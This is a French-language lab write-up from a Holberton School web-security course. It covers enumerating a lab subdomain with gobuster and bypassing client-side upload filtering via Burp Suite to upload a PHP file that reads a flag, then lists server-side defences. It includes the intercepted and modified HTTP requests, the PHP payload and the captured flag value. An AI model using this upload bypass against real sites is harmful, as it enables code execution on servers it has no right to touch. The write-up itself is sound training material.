# Documentation - Upload Vulnerabilities (0x05)

## Informations générales

**Subdomain cible** : `test-s3.web0x05.hbtn`
**Machine cible** : Cyber - WebSec 0x05

---

## Task 0 : Identifier le sous-domaine vulnérable

### Objectif
Identifier le sous-domaine vulnérable de l'application web.

### Méthodologie

1. **Énumération de Virtual Hosts avec Gobuster**

   Utiliser `gobuster` en mode `vhost` pour énumérer les sous-domaines :

   ```bash
   gobuster vhost -u http://web0x05.hbtn \
                  -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt \
                  -t 800 \
                  --append-domain
   ```

   **Explication des paramètres** :
   - `vhost` : Mode d'énumération de virtual hosts
   - `-u` : URL de base du domaine cible
   - `-w` : Wordlist de sous-domaines (n0kovo_subdomains est complète et efficace)
   - `-t 800` : Nombre de threads (800 pour une énumération rapide)
   - `--append-domain` : Ajoute automatiquement le domaine de base aux mots de la wordlist

2. **Analyse des résultats**

   Gobuster affichera les sous-domaines trouvés avec leur code de statut HTTP :
   ```
   Found: test-s3.web0x05.hbtn (Status: 200)
   ```

3. **Vérification manuelle**

   Une fois le sous-domaine identifié, le tester dans un navigateur :
   ```bash
   curl -I http://test-s3.web0x05.hbtn
   ```

### Résultat

**Sous-domaine vulnérable trouvé** : `test-s3.web0x05.hbtn`

**Fichier de sortie** : [0-target.txt](0-target.txt)

```
test-s3.web0x05.hbtn
```

---

## Task 1 : Bypass du filtrage client-side

### Objectif
Bypasser le filtrage de type de fichier côté client pour uploader un fichier PHP et récupérer le flag.

### Vulnérabilité
L'application utilise uniquement une validation JavaScript côté client pour vérifier le type de fichier uploadé. Cette validation peut être contournée en interceptant et modifiant la requête HTTP avant qu'elle n'atteigne le serveur.

### Prérequis
- Burp Suite configuré et fonctionnel
- Navigateur configuré pour utiliser Burp comme proxy (127.0.0.1:8080)
- Une image PNG quelconque

### Méthodologie détaillée

#### Étape 1 : Préparation du fichier

Avoir une image PNG à disposition (n'importe laquelle) :
```bash
# Option 1 : Utiliser une image existante
cp /path/to/any/image.png payload.png

# Option 2 : Créer une image simple
convert -size 100x100 xc:white payload.png

# Option 3 : Télécharger une image
wget https://via.placeholder.com/150.png -O payload.png
```

#### Étape 2 : Configuration de Burp Suite

1. Lancer Burp Suite :
   ```bash
   burpsuite
   ```

2. Configurer Firefox pour utiliser le proxy Burp :
   - Ouvrir Firefox
   - Aller dans **Paramètres → Réseau → Paramètres de connexion**
   - Sélectionner **Configuration manuelle du proxy**
   - HTTP Proxy : `127.0.0.1`
   - Port : `8080`
   - Cocher **Utiliser ce serveur proxy pour tous les protocoles**

3. Dans Burp Suite :
   - Aller dans **Proxy → Intercept**
   - S'assurer que **"Intercept is off"** pour le moment

#### Étape 3 : Accès au endpoint vulnérable

1. Naviguer vers : `http://test-s3.web0x05.hbtn/task1`
2. Observer le formulaire d'upload

#### Étape 4 : Activation de l'interception

1. Dans Burp Suite, activer l'interception : **"Intercept is on"**
2. Dans Firefox, sélectionner le fichier `payload.png`
3. Cliquer sur le bouton **Upload**

#### Étape 5 : Interception et modification de la requête

La requête interceptée ressemble à ceci :

```http
POST /api/task1/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task1
Content-Type: multipart/form-data; boundary=---------------------------372773235834417249173309245902
Content-Length: 4770
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------372773235834417249173309245902
Content-Disposition: form-data; name="file"; filename="payload.png"
Content-Type: image/png

[Contenu binaire de l'image PNG...]
-----------------------------372773235834417249173309245902--
```

**Modifications à effectuer** :

1. **Changer le filename** :
   ```
   filename="payload.png"  →  filename="payload.php"
   ```

2. **Remplacer le contenu binaire** par le payload PHP :
   ```php
   <?php readfile('FLAG_1.txt') ?>
   ```

3. **Garder** `Content-Type: image/png` (ne pas modifier)

**Requête modifiée** :

```http
POST /api/task1/ HTTP/1.1
Host: test-s3.web0x05.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://test-s3.web0x05.hbtn/task1
Content-Type: multipart/form-data; boundary=---------------------------372773235834417249173309245902
Content-Length: 240
Origin: http://test-s3.web0x05.hbtn
Connection: keep-alive

-----------------------------372773235834417249173309245902
Content-Disposition: form-data; name="file"; filename="payload.php"
Content-Type: image/png

<?php readfile('FLAG_1.txt') ?>
-----------------------------372773235834417249173309245902--
```

#### Étape 6 : Envoi de la requête modifiée

1. Cliquer sur **Forward** dans Burp Suite
2. Désactiver l'interception : **"Intercept is off"**

#### Étape 7 : Vérification de l'upload

1. Retourner sur la page `http://test-s3.web0x05.hbtn/task1`
2. Observer que `payload.php` a été uploadé avec succès
3. Copier le lien du fichier uploadé (bouton "copy link")

#### Étape 8 : Exécution du payload et récupération du flag

**Méthode 1 : Via navigateur**
```
http://test-s3.web0x05.hbtn/static/upload/payload.php
```

**Méthode 2 : Via curl**
```bash
curl http://test-s3.web0x05.hbtn/static/upload/payload.php
```

### Résultat

**FLAG récupéré** : `1d38ded926706bc96695b2ec52263bfd`

**Fichier de sortie** : [1-flag.txt](1-flag.txt)

```
1d38ded926706bc96695b2ec52263bfd
```

---

## Explication de la vulnérabilité

### Pourquoi cela fonctionne ?

1. **Validation client-side uniquement** : L'application vérifie le type de fichier uniquement via JavaScript dans le navigateur
2. **Pas de validation serveur** : Le serveur accepte n'importe quel fichier sans vérification côté backend
3. **Exécution PHP activée** : Le serveur exécute les fichiers `.php` dans le répertoire d'upload

### Comment se protéger ?

1. **Validation côté serveur obligatoire** :
   ```php
   // Vérifier l'extension
   $allowed = ['jpg', 'jpeg', 'png', 'gif'];
   $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
   if (!in_array(strtolower($ext), $allowed)) {
       die('Type de fichier non autorisé');
   }

   // Vérifier le MIME type réel
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
   if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
       die('Type MIME invalide');
   }
   ```

2. **Renommer les fichiers uploadés** :
   ```php
   $new_name = md5(uniqid()) . '.png';
   ```

3. **Stocker les uploads hors du webroot** ou désactiver l'exécution PHP :
   ```apache
   # .htaccess dans le dossier upload
   php_flag engine off
   ```

4. **Vérifier le contenu réel du fichier** (magic bytes) :
   ```php
   // Vérifier les magic bytes d'une image PNG
   $handle = fopen($_FILES['file']['tmp_name'], 'rb');
   $header = fread($handle, 8);
   fclose($handle);

   $png_header = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a";
   if ($header !== $png_header) {
       die('Pas une vraie image PNG');
   }
   ```

5. **Liste blanche stricte** plutôt que liste noire

---

## Outils utilisés

- **Gobuster** : Énumération de virtual hosts et sous-domaines
- **Burp Suite** : Proxy d'interception HTTP
- **Firefox** : Navigateur avec configuration proxy
- **curl** : Client HTTP en ligne de commande

---

## Références

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger - File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

---

**Date** : 2025-10-13
**Auteur** : Patri
**Projet** : Holberton School - Cyber Security - Web Application Security
